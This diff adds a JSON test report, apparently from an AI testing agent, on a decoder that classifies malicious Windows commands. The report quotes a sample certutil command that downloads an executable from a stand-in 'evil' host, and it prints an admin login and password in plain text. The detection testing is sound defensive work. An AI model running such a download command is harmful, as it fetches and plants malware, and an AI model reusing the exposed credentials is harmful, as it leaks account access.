@@ -1,0 +1,39 @@
+{
+  "summary": "Iteration-25 P0 verification for NivXRay RC4.4 (CMD Runtime Reconstruction) + RC4.5 (honesty_linter) + Iteration-24 Flow-1 regex fix. 10 pytest cases against live preview /api/decode/smart. Result: 8 PASSED, 1 FAILED (P0-FEAT-6 LOLBIN classification), 1 SKIPPED (P0-REG-10 plugin count is 59 not 60). Powershell-normalize regex fix VERIFIED (both comma- and whitespace-separated variants). Honesty linter VERIFIED (downgrades partial reconstruction, does NOT false-downgrade benign). RC4.4 core reconstruction VERIFIED (calc.exe demo, partial reconstruction with unresolved_vars). Zero regressions on base64 and operations registry.",
+  "backend_issues": {
+    "critical": [
+      {
+        "endpoint": "/api/decode/smart (cmd_runtime_reconstruct decoder)",
+        "issue": "P0-FEAT-6 FAILS. Input `cmd /c certutil.exe -urlcache -f http://evil/x.exe C:\\a.exe` does NOT attach `cmd_runtime_reconstruct` block at all (field is null). The RC4.4 detect() in /app/backend/decoders/cmd_runtime_reconstruct.py only triggers on `%VAR:~a,b%` envvar-substring patterns, so plain LOLBIN cmd invocations skip the decoder entirely. Consequently no `verdict={verdict:'malicious', category:'lolbin-execution'}` sub-block is emitted from the RC4.4 engine and MITRE T1218 is missing from the top-level `mitre` list (T1218 shows only inside `lolbas[0].mitre`, not promoted to `result.mitre`). Top-level `verdict_card` DOES correctly flag Malicious via existing LOLBAS shield, so runtime security signal is not lost — but the RC4.4 spec contract in the review request is not met.",
+        "priority": "HIGH"
+      }
+    ],
+    "minor": [
+      {
+        "endpoint": "startup log",
+        "issue": "P0-REG-10 spec expected `Decoder registry ready — 60 plugins loaded` but last two startups report 59 (was 58 pre-RC4.4, so RC4.4 added exactly one plugin, not two). Either the spec count is wrong or one expected plugin is missing from the registry — worth main-agent confirming which decoders were expected in the +2 delta."
+      }
+    ]
+  },
+  "frontend_issues": {"ui_bugs": [], "integration_issues": [], "design_issues": []},
+  "test_report_links": [
+    "/app/backend/tests/test_rc4_verification.py",
+    "/app/test_reports/pytest/iter25_results.xml"
+  ],
+  "action_items": [
+    "Extend /app/backend/decoders/cmd_runtime_reconstruct.py detect() so it fires on cmd LOLBIN invocations (certutil/mshta/regsvr32/rundll32/wmic/bitsadmin etc.) even when no %VAR:~a,b% substring picker is present — required so P0-FEAT-6 returns cmd_runtime_reconstruct.verdict.verdict='malicious', category='lolbin-execution', with T1218 in mitre. Alternatively, ensure LOLBAS-derived MITRE IDs (T1218 etc.) are merged into the top-level `mitre` list.",
+    "Investigate the 59-vs-60 plugin count discrepancy — either update the P0-REG-10 spec, or register the missing decoder."
+  ],
+  "critical_code_review_comments": [
+    "cmd_runtime_reconstruct.detect() is too narrow: it currently gates on %VAR:~a,b% patterns only. LOLBIN-style malicious cmd invocations without substring pickers bypass the engine and never emit the RC4.4 verdict block, weakening the deterministic-first promise for the certutil/rundll32/mshta class of samples.",
+    "MITRE promotion inconsistency: T1218 present in `lolbas[i].mitre` but not merged into top-level `mitre[]` for the certutil sample. Consumers reading `mitre[]` alone will miss T1218 (Signed Binary Proxy Execution)."
+  ],
+  "updated_files": ["/app/backend/tests/test_rc4_verification.py"],
+  "success_rate": {"backend": "80%", "frontend": "n/a (backend only per request)"},
+  "test_credentials": "admin@nivxray.com / uulVDp5cCSB3Hva99s7UUAwK (from /app/memory/test_credentials.md — verified via /api/auth/login → access_token)",
+  "seed_data_creation": "None",
+  "retest_needed": true,
+  "main_agent_can_self_test": true,
+  "context_for_next_testing_agent": "Live preview URL: https://greeting-app-5782.preview.emergentagent.com. Cloudflare occasionally returns intermittent 502 — retry after ~30s. Test file /app/backend/tests/test_rc4_verification.py is pytest-based; run with `python -m pytest backend/tests/test_rc4_verification.py -v -o addopts=''` (pytest.ini enables xdist which can cause worker-scoped fixture issues). Passing: P0-BUG-1/2 (powershell-normalize regex accepts `[\\s,]-`), P0-BUG-3/4 (honesty_linter partial-reconstruction downgrade + no-false-downgrade on echo hello), P0-FEAT-5 (calc.exe reconstruction: reconstructed='cmd.exe /c CalC.exe', chars=['C','a','l','C'], confidence.overall=98, verdict.verdict='benign-demonstration'), P0-FEAT-7 (unresolved_vars=['unknownvar']), P0-REG-8 (operations registry lists cmd-runtime-reconstruct + all prior 7 ops), P0-REG-9 (base64 Hello World! preserved). Failing: P0-FEAT-6 — see backend_issues.critical.",
+  "rca of the issue": "cmd_runtime_reconstruct decoder's detect() (lines 786-806 of /app/backend/decoders/cmd_runtime_reconstruct.py) requires an obfuscation pattern (%VAR:~a,b%, caret escapes, or !VAR:~a,b! delayed expansion) to return non-zero confidence. Input `cmd /c certutil.exe -urlcache -f http://evil/x.exe C:\\a.exe` contains none of these, so detect() returns confidence=0.0 and the engine never runs — hence result.cmd_runtime_reconstruct is null. Fix: add a LOLBIN-name heuristic branch to detect() that returns e.g. confidence=0.60 when a known LOLBIN executable name is present after `cmd /c`, then let build_verdict() (line ~465-478) emit the malicious + lolbin-execution verdict, and promote lolbas[].mitre into top-level mitre[] inside routers/ops.py."
+}
